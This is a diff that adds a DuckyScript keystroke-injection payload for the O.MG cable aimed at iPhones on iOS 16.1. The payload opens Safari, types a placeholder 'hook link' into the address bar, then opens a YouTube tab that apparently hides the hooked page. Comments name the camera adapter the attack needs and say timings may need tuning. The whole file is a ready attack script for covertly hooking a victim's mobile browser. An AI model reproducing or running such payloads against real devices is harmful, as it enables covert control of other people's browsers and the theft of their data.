@@ -1,0 +1,30 @@
+REM Version 1.0
+REM OS: iOS
+REM Author: Peaakss
+REM Description: A simple payload that opens safari and inserts a hook link then opens a new tab on youtube
+REM NOTICE CHANGE "HOOK LINK" to your desired link | EXAMPLE: STRING hook.com |
+REM NOITCE Payload was made on iOS 16.1 - iPhone | Timing may have have to be changed based on version/model
+REM NOTICE Lighting to USB-A or USB-C camera adapter is needed to run this payload, ative end of the O.MG cable must be plugged into the end of the adapter
+
+GUI h
+DELAY 100
+GUI SPACE
+DELAY 150
+BACKSPACE
+DELAY 250
+STRING Safari
+DELAY 100
+ENTER
+DELAY 500
+GUI t
+DELAY 250
+GUI l
+DELAY 100
+STRING "HOOK LINK"
+DELAY 250
+ENTER
+GUI t
+DELAY 100
+STRING www.youtube.com
+DELAY 250
+ENTER
